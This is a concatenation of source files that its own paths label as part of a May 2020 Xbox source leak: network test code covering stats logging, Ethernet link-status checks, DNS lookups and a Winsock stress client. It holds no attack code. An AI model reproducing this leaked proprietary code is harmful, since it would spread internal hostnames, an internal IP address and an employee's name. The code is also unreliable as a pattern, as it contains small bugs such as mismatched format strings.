Arguments:

  hLog - Handle to the log object
  lpszBanner - Banner string
  nPayload - Payload
  nPayloadTotal - Total payload
  nEthernetOverhead - Ethernet overhead
  nEthernetTotal - Total ethernet
  KernelTime - Kernel time
  InterruptTime - Interrupt time
  DpcTime - Dpc time
  IdleTime - Idle time
  dwAverage - Number to average stats

Return Value:

  None

------------------------------------------------------------------------------*/
{
    // TotalTime is the total time
    ULONG   TotalTime;
    // CPUUsage is the CPU Usage (percentage)
    DOUBLE  CPUUsage;



    if (0 == dwAverage) {
        dwAverage = 1;
    }

    // Write the stats to the csv log file
    Log_va(hLog, FALSE, "%s,", lpszBanner);
    Log_va(hLog, FALSE, "%u,", nPayload);
    Log_va(hLog, FALSE, "%u,", nPayloadTotal);
    Log_va(hLog, FALSE, "%u,", nEthernetOverhead);
    Log_va(hLog, FALSE, "%u,", nEthernetTotal);
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) KernelTime / (DOUBLE) dwAverage));
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) InterruptTime / (DOUBLE) dwAverage));
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) DpcTime / (DOUBLE) dwAverage));
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) IdleTime / (DOUBLE) dwAverage));

    TotalTime = KernelTime + InterruptTime + DpcTime + IdleTime;
    Log_va(hLog, FALSE, "%.3f,", ((DOUBLE) TotalTime / (DOUBLE) dwAverage));

    if (0 == TotalTime) {
        CPUUsage = 0;
    }
    else {
        CPUUsage = 100 - (100 * ((DOUBLE) IdleTime / (DOUBLE) TotalTime));
    }
    Log_va(hLog, FALSE, "%.3f\r\n", CPUUsage);
}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xnetapi\GetEthernetLinkStatus.c ===
/*
 * File             :       GetEthernetLinkStatus.c
 * Author           :       Jim Y
 * Revision History
 *      Jun/02/2001   JimY        Created
 *
 * This file contains code for testing the XNetGetEthernetLinkStatus() API
 */


#include <precomp.h>

#define PASS 0
#define FAIL 1


//
// Functions local to this module
//
#define BREAK_INTO_DEBUGGER __asm int 3
#define WARNFAIL(_apiname) \
        DbgPrint(#_apiname " failed: %d %d\n", err, GetLastError())




/*
 * Main 
 *
 *
 */

void DoGetEthernetLinkStatus(HANDLE hLog) {

    DWORD dwLinkStatus = 0;
    INT LinkStatusTestcase, result = 0;
    INT nSleepDelay = 2000;


    //
    // Read info from .INI file
    //
    LinkStatusTestcase = GetProfileInt(L"XNetAPI", L"LinkStatusTestcase", 0);
    DbgPrint("GetEthernetLinkStatus.C: Read from INI file that LinkStatusTestcase = %d \n", LinkStatusTestcase);


    //
    // If LinkStatusTestcase is 1 then run Basic set of link tests
    //

    if (LinkStatusTestcase == 1)  {

       //
       // Wall switch testcase 
       //
       xStartVariation(hLog, "100mbit switch test");
       DbgPrint("GetEthernetLinkStatus.C: Will now test for a 100MBit Switch Full Duplex (your wall switch) , do a (G)o in your debugger.\n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_100MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 100mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_FULL_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be FULL DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "100mbit switch test");
       else
           xLog(hLog, XLL_PASS, "100mbit switch test");



       //
       // 10mbit Hub testcase 
       //
       xStartVariation(hLog, "10mbit hub test");
       DbgPrint("GetEthernetLinkStatus.C: Now, connect the XBox to a 10mbit hub HALF Duplex (A 10mbit Hub) then do a (G)o in the debugger \n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_10MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 10mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_HALF_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be HALF DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "10mbit hub test");
       else
           xLog(hLog, XLL_PASS, "10mbit hub test");


       //
       // 100mbit Hub testcase 
       //
       xStartVariation(hLog, "100mbit hub test");
       DbgPrint("GetEthernetLinkStatus.C: Now, connect the XBox to a 100mbit hub HALF Duplex (A 100mbit Hub) then do a (G)o in the debugger \n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_100MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 100mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_HALF_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be HALF DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "100mbit hub test");
       else
           xLog(hLog, XLL_PASS, "100mbit hub test");




       //
       // Crossover Cable 
       //
       xStartVariation(hLog, "Crossover cable (100mbit FULL DUPLEX) test");
       DbgPrint("GetEthernetLinkStatus.C: Now, connect the XBox using a CROSSOVER cable (CROSSOVER CABLE) then do a (G)o in the debugger \n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_100MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 100mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_FULL_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be FULL DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "Crossover cable (100mbit FULL DUPLEX) test");
       else
           xLog(hLog, XLL_PASS, "Crossover cable (100mbit FULL DUPLEX) test");



       //
       // Disconnected Cable 
       //
       xStartVariation(hLog, "Disconnected cable test");
       DbgPrint("GetEthernetLinkStatus.C: Now, DISCONNECT the XBox network cable then do a (G)o in the debugger \n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 != (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to be ACTIVE [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "Disconnected cable test");
       else
           xLog(hLog, XLL_PASS, "Disconnected cable test");


       xEndVariation( hLog );


       //
       // Write to the INI file so that LinkStatusTestcase = 2 for the next boot.
       //

       DbgPrint("GetEthernetLinkStatus.C: Writing to the TESTINI.INI file to set LinkStatusTestcase = %d \n", 2);
       WriteProfileString(L"XNetAPI", L"LinkStatusTestcase", L"2");
       Sleep(nSleepDelay);
       DbgPrint("GetEthernetLinkStatus.C: Now, DISCONNECT the XBox network cable then do a .REBOOT in the debugger \n");
       BREAK_INTO_DEBUGGER

    }



    //
    // If LinkStatusTestcase is 2 then run the disconnected cable test
    //

    else if (LinkStatusTestcase == 2)  {

       //
       // Disconnected Cable 
       //
       xStartVariation(hLog, "PreBoot Disconnected cable test");
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 != (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to be ACTIVE [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "PreBoot Disconnected cable test");
       else
           xLog(hLog, XLL_PASS, "PreBoot Disconnected cable test");


       xEndVariation( hLog );

    }


    //
    // If LinkStatusTestcase is 3 then run exhaustive switch configured link tests
    //

    else if (LinkStatusTestcase == 3)  {

       xStartVariation(hLog, "XNetGetEthernetLinkStatus() EXHAUSTIVE switch-based tests");

       //
       // Switch port is set to AutoNegotiate
       //
       xStartVariation(hLog, "AutoNegotiate Test");
       DbgPrint("GetEthernetLinkStatus.C: Will now test an AutoNegotiated port, do a (G)o in your debugger.\n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_100MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 100mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_FULL_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be FULL DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "AutoNegotiate Test");
       else
           xLog(hLog, XLL_PASS, "AutoNegotiate Test");


       //
       // Switch port is set to 100 ForceFullDuplex
       //
       xStartVariation(hLog, "100mbit ForceFullDuplex");
       DbgPrint("GetEthernetLinkStatus.C: Will now test an 100mbit ForceFullDuplex port, do a (G)o in your debugger.\n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_100MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 100mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_FULL_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be FULL DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "100mbit ForceFullDuplex");
       else
           xLog(hLog, XLL_PASS, "100mbit ForceFullDuplex");


       //
       // Switch port is set to 100 ForceHalfDuplex
       //
       xStartVariation(hLog, "100mbit ForceHalfDuplex");
       DbgPrint("GetEthernetLinkStatus.C: Will now test an 100mbit ForceHalfDuplex port, do a (G)o in your debugger.\n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_100MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 100mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_HALF_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be HALF DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "100mbit ForceHalfDuplex");
       else
           xLog(hLog, XLL_PASS, "100mbit ForceHalfDuplex");


       //
       // Switch port is set to 10 ForceFullDuplex
       //
       xStartVariation(hLog, "10mbit ForceFullDuplex");
       DbgPrint("GetEthernetLinkStatus.C: Will now test an 10mbit ForceFullDuplex port, do a (G)o in your debugger.\n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_10MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 10mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_FULL_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be FULL DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "10mbit ForceFullDuplex");
       else
           xLog(hLog, XLL_PASS, "10mbit ForceFullDuplex");


       //
       // Switch port is set to 10 ForceHalfDuplex
       //
       xStartVariation(hLog, "10mbit ForceHalfDuplex");
       DbgPrint("GetEthernetLinkStatus.C: Will now test an 10mbit ForceHalfDuplex port, do a (G)o in your debugger.\n");
       BREAK_INTO_DEBUGGER
       Sleep(nSleepDelay);
       dwLinkStatus = XNetGetEthernetLinkStatus();
       DbgPrint("GetEthernetLinkStatus.C: After dwLinkStatus = %d \n", dwLinkStatus);

       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_ACTIVE) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT active [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_10MBPS) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be 10mbit [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }
       if (0 == (dwLinkStatus & XNET_ETHERNET_LINK_HALF_DUPLEX) )   {
           DbgPrint("GetEthernetLinkStatus.C: ERROR - LinkStatus appears to NOT be HALF DUPLEX [Status = %d]! \n", dwLinkStatus);
           result = FAIL;
       }

       if (result != PASS)
           xLog(hLog, XLL_FAIL, "10mbit ForceHalfDuplex");
       else
           xLog(hLog, XLL_PASS, "10mbit ForceHalfDuplex");



       xEndVariation( hLog );

    }


    //
    // If LinkStatusTestcase is not 1 or 2 or 3 then skip running the 
    // XNetGetEthernetLinkStatus() API tests.
    //

    else  {
       xStartVariation(hLog, "XNetGetEthernetLinkStatus() API tests");
       DbgPrint("GetEthernetLinkStatus.C: Warning - we have chosen to skip the XNetGetEthernetLinkStatus() \n");
       xLog(hLog, XLL_INFO, "XNetGetEthernetLinkStatus() API tests were skipped");
       xEndVariation( hLog );
    }


    DbgPrint("GetEthernetLinkStatus.C: Test has finished running!\n");


}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\xnetapi\dnslookup.c ===
/*
 * File             :       DNSLookup.c
 * Author           :       Jim Y
 * Revision History
 *      Jun/02/2001   JimY        Created
 *
 * This file contains code for testing the XNetGetEthernetLinkStatus() API
 * 
 * 
 *     INT     XNetDnsLookup(const char * pszHost, WSAEVENT hEvent, XNDNS ** ppxndns);
 *     INT     XNetDnsRelease(XNDNS * pxndns);
 * 
 */


#include <precomp.h>

#define PASS 0
#define FAIL 1


//
// Functions local to this module
//
#define BREAK_INTO_DEBUGGER __asm int 3
#define WARNFAIL(_apiname) \
        DbgPrint(#_apiname " failed: %d %d\n", err, GetLastError())




/*
 * Main 
 *
 *
 */

void DoDNSLookup(HANDLE hLog) {
    
    INT     result = 0;
    INT    iResult = 0;
    DWORD dwResult = 0;
    HANDLE  hEvent = NULL;
    XNDNS * pxndns = NULL;
    XNADDR  XnAddr;

    iResult = XNetStartup(NULL);

    while ( 0 == (dwResult = XNetGetTitleXnAddr(&XnAddr)) ) {
       Sleep(1000);	
    }


    //*****************************************************************************
    // Valid Lookup 
    //

    xStartVariation(hLog, "Valid DNSLookup test");
    DbgPrint("DoDNSLookup.C: Valid DNSLookup test \n");
    result = FAIL;

    hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    ResetEvent(hEvent);

    iResult = XNetDnsLookup("jimy1.redmond.corp.microsoft.com", hEvent, &pxndns);
    if (iResult != 0)  
       DbgPrint("DoDNSLookup.C: iResult failed with a result of %d = %d \n", iResult);
    else 
       DbgPrint("DoDNSLookup.C: iResult passed with a result of %d = %d \n", iResult);
       
    //
    // Check if WaitForSingleObject times out or not
    //
    if (WaitForSingleObject(hEvent, 10000) != WAIT_TIMEOUT)  {

       DbgPrint("DoDNSLookup.C: xNetDNSLookup() did NOT timeout.  hEvent = %d \n", hEvent);

       //
       // Verify pxndns->iStatus and pxndns->cina
       //
       DbgPrint("DoDNSLookup.C: iStatus = %d  cina = %d \n", pxndns->iStatus, pxndns->cina);
       if ((pxndns->iStatus == 0) && (pxndns->cina > 0))  {

          DbgPrint("DoDNSLookup.C: Host was found as expected. Setting result to PASS.\n");
          result = PASS;
          }

       else  {

          DbgPrint("DoDNSLookup.C: Host was not found but should have been found. \n");
          }

       }

    //
    // WaitForSingleObject timed out
    //
    else  {

       DbgPrint("DoDNSLookup.C: xNetDNSLookup() WaitForSingleObject timed out.  hEvent = %d \n", hEvent);
       BREAK_INTO_DEBUGGER
    }  // WaitForSingleObject



    //
    // Release handles that we used
    //
    XNetDnsRelease(pxndns);
    CloseHandle(hEvent);


    if (result != PASS)
        xLog(hLog, XLL_FAIL, "Valid DNSLookup test");
    else
        xLog(hLog, XLL_PASS, "Valid DNSLookup test");


    xEndVariation( hLog );





    //*****************************************************************************
    // Invalid Lookup 
    //

    xStartVariation(hLog, "Invalid DNSLookup test");
    DbgPrint("DoDNSLookup.C: Invalid DNSLookup test \n");
    result = FAIL;

    hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    ResetEvent(hEvent);

    iResult = XNetDnsLookup("jimybogus.redmond.corp.microsoft.com", hEvent, &pxndns);
    if (iResult != 0)  
       DbgPrint("DoDNSLookup.C: iResult failed with a result of %d = %d \n", iResult);
    else 
       DbgPrint("DoDNSLookup.C: iResult passed with a result of %d = %d \n", iResult);


    //
    // Check if WaitForSingleObject times out or not
    //
    if (WaitForSingleObject(hEvent, 10000) != WAIT_TIMEOUT)  {

       DbgPrint("DoDNSLookup.C: xNetDNSLookup() did NOT timeout.  hEvent = %d \n", hEvent);

       //
       // Verify pxndns->iStatus and pxndns->cina
       //
       DbgPrint("DoDNSLookup.C: iStatus = %d  cina = %d \n", pxndns->iStatus, pxndns->cina);
       if ((pxndns->iStatus == WSAHOST_NOT_FOUND) && (pxndns->cina == 0))  {

          DbgPrint("DoDNSLookup.C: Host was not found, as expected.  Setting result to PASS.\n");
          result = PASS;
          }

       else
             {

          DbgPrint("DoDNSLookup.C: Result should have been WSAHOST_NOT_FOUND but it was not. \n");
          }

       }

    //
    // WaitForSingleObject timed out
    //
    else  {

       DbgPrint("DoDNSLookup.C: xNetDNSLookup() timed out.  hEvent = %d \n", hEvent);
       BREAK_INTO_DEBUGGER
    }  // WaitForSingleObject



    //
    // Release handles that we used
    //
    XNetDnsRelease(pxndns);
    CloseHandle(hEvent);


    if (result != PASS)
        xLog(hLog, XLL_FAIL, "Invalid DNSLookup test");
    else
        xLog(hLog, XLL_PASS, "Invalid DNSLookup test");


    xEndVariation( hLog );



    //*****************************************************************************
    // Test iStatus result 
    //

    xStartVariation(hLog, "iStatus is WSAEINPROGRESS test");
    DbgPrint("DoDNSLookup.C: iStatus is WSAEINPROGRESS test \n");
    result = FAIL;

    hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
    ResetEvent(hEvent);

    iResult = XNetDnsLookup("jimy1.redmond.corp.microsoft.com", hEvent, &pxndns);
    if (iResult != 0)  
       DbgPrint("DoDNSLookup.C: iResult failed with a result of %d = %d \n", iResult);
    else 
       DbgPrint("DoDNSLookup.C: iResult passed with a result of %d = %d \n", iResult);

    //
    // Immediately verify pxndns->iStatus
    //
    while (pxndns->iStatus == WSAEINPROGRESS)  {
       DbgPrint("DoDNSLookup.C: iStatus = %d (WSAEINPROGRESS). Setting result to PASS \n", pxndns->iStatus);
       result = PASS;
       }

    //
    // Verify pxndns->iStatus and pxndns->cina
    //
    DbgPrint("DoDNSLookup.C: iStatus = %d  cina = %d \n", pxndns->iStatus, pxndns->cina);
    if ((pxndns->iStatus == 0) && (pxndns->cina > 0))  {

       DbgPrint("DoDNSLookup.C: Host was found as expected. Setting result to PASS.\n");
       }

    else  {
       DbgPrint("DoDNSLookup.C: Host was not found but should have been found. \n");
       }


    //
    // Release handles that we used
    //
    XNetDnsRelease(pxndns);
    CloseHandle(hEvent);


    if (result != PASS)
        xLog(hLog, XLL_FAIL, "iStatus is WSAEINPROGRESS test");
    else
        xLog(hLog, XLL_PASS, "iStatus is WSAEINPROGRESS test");


    xEndVariation( hLog );










    DbgPrint("DoDNSLookup.C: Test has finished running!\n");


}
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\winsock\stress\sledge\xbox\xsledge.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "xsledge.h"

//==================================================================================
// Defines
//==================================================================================
#undef MIN
#undef MAX
#define MIN(a, b) ((a) < (b) ? (a) : (b))
#define MAX(a, b) ((a) > (b) ? (a) : (b))
#define MAX_CLIENT_CONNS    50
#define MAX_LINE 80
#define MAX_SERV_CONNS      50


//==================================================================================
// Globals
//==================================================================================
CHAR *CONN_TYPES_Str[] =
{
    "TCP",
    "UDP",
};

SLEDGE_PARMS g_SledgeParms =
{
    SERV_TCP,
    SERV_UDP,
    SERV_TCP_ADDR,
    SERV_UDP_ADDR,
    SERV_RECV_LEN,
    CLIENT_TCP_CONNS,
    CLIENT_TCP_CYCLES,
    CLIENT_UDP_CONNS,
    CLIENT_UDP_CYCLES,
    MIN_PACKET_LEN,
    MAX_PACKET_LEN,
    MIN_PACKET_LEN,
    MAX_PACKET_LEN,
    PACKETS_PER_CONN,
    CLIENT_PERCENT_SLEEPY_RECVS,
    SERV_PERCENT_SLEEPY_RECVS,
    UDP_SLEEP_BEFORE_NEXT,
    IN_FLIGHT_CLOSES
};

// States that sockets can be monitored for
typedef enum _SOCKET_STATE
{
    READABLE,
    WRITEABLE,
    EXCEPTION
} SOCKET_STATE;

CRITICAL_SECTION    g_csSerializeAccess;
CRITICAL_SECTION    g_csSledgeCritSection;
DWORD               g_dwTotalPacketsIn = 0, g_dwTotalBytesIn = 0, g_dwLastTime;
HANDLE              g_hCreateThreadsEvent;
CLIENT_CONNS        g_ccClientConns[MAX_CLIENT_CONNS];
SERV_CONNS          g_scServConns  [MAX_SERV_CONNS];
INT                 g_iServConns = 0, g_iClientConns = 0;
TCHAR               g_lpszCfgFileName[MAX_LINE];
BOOL                g_fIsServer = FALSE, g_fExit = FALSE, g_bFinished = FALSE;
BOOL                g_fVerbose = FALSE, g_fNonBlocking = FALSE;
PACKET_TYPE         g_ptTxDataType = CONSTANT;
SOCKET              g_sTCPServer = INVALID_SOCKET, g_sUDPServer = INVALID_SOCKET;
HANDLE              g_hLog = INVALID_HANDLE_VALUE;

//==================================================================================
// Functions
//==================================================================================
void WINAPI SledgeLog(HANDLE hLog, DWORD dwLogLevel, LPSTR szFormat, ...)
{
    va_list pArgs;
    va_start(pArgs, szFormat);

    if(hLog != INVALID_HANDLE_VALUE)
        xLog_va(hLog, dwLogLevel, szFormat, pArgs);

    va_end(pArgs);
}

//==================================================================================
// DllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//  HINSTANCE   hInstance       Handle to module
//  DWORD       dwReason        Indicates the reason for calling the function
//  LPVOID      lpContext       reserved
// Returns:
//  TRUE on success
//==================================================================================
BOOL WINAPI DllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
    // We'll initialize/delete the global critical section here
    switch(dwReason)
    {
    case DLL_PROCESS_ATTACH:
        XnetInitialize(NULL, TRUE);
        InitializeCriticalSection(&g_csSerializeAccess);
        InitializeCriticalSection(&g_csSledgeCritSection);
        break;
    case DLL_PROCESS_DETACH:
        XnetCleanup();
        DeleteCriticalSection(&g_csSerializeAccess);
        DeleteCriticalSection(&g_csSledgeCritSection);
        break;
    default:
        break;
    }

    return TRUE;
}

//==================================================================================
// HardcodeTestSettings
//----------------------------------------------------------------------------------
//
// Description: Hardcodes globals for this test
//
// Arguments:
//  none
//
// Returns:
//  none
//==================================================================================
void HardcodeTestSettings(void)
{
    DWORD dwIPAddr = 0;
    g_fVerbose = TRUE;
    g_fNonBlocking = FALSE;
    g_ptTxDataType = CONSTANT;
    g_SledgeParms.InFlightCloses = FALSE;
    g_fIsServer = FALSE;
    g_SledgeParms.ServUDP = FALSE;
    g_SledgeParms.ServTCP = FALSE;
    g_SledgeParms.PacketsPerConn = 500;
    g_SledgeParms.ClientTCPConns = 2;
    g_SledgeParms.ClientTCPCycles = 10000;
    g_SledgeParms.TCPMaxPacketLen = MAX_PACKET_LEN;
    g_SledgeParms.TCPMinPacketLen = MIN_PACKET_LEN;
    dwIPAddr = inet_addr("157.56.10.105");
    g_SledgeParms.ServTCPAddr = htonl(dwIPAddr);
    g_SledgeParms.ClientUDPConns = 0;
    g_SledgeParms.ClientSleepyRecvs = 0;

    if(g_fIsServer)
    {
        g_SledgeParms.ClientTCPConns    = 0;
        g_SledgeParms.ClientUDPConns    = 0;
    }
    else
    {
        g_SledgeParms.ServTCP           = FALSE;
        g_SledgeParms.ServUDP           = FALSE;
    }

    g_iClientConns = g_SledgeParms.ClientTCPConns + g_SledgeParms.ClientUDPConns;

    return;
}

//==================================================================================
// IsSocketReady
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//  SOCKET          Socket              Socket to monitor for a given state
//  SOCKET_STATE    SocketState         State to monitor for
// Returns:
//  Returns TRUE if the activity has occured, FALSE otherwise
//==================================================================================
BOOL IsSocketReady(SOCKET Socket, SOCKET_STATE SocketState, DWORD dwSecondsToWait)
{
    fd_set SocketCollection, *ReadCollection, *WriteCollection, *ExceptCollection;
    timeval TimeOut = {0,0}, *pTimeOut = NULL;

    // If we have a bad socket, just report FALSE
    if(Socket == INVALID_SOCKET)
        return FALSE;

    if(dwSecondsToWait != TIME_INFINITY)
    {
        TimeOut.tv_sec = dwSecondsToWait;
        pTimeOut = &TimeOut;
    }

    FD_ZERO(&SocketCollection);
    FD_SET(Socket, &SocketCollection);

    // Depending on the activity to monitor for, setup the parameters to select
    switch(SocketState)
    {
    case READABLE:
        ReadCollection = &SocketCollection;
        WriteCollection = NULL;
        ExceptCollection = NULL;
        break;
    case WRITEABLE:
        ReadCollection = NULL;
        WriteCollection = &SocketCollection;
        ExceptCollection = NULL;
        break;
    default:
        ReadCollection = NULL;
        WriteCollection = NULL;
        ExceptCollection = &SocketCollection;
        break;
    }

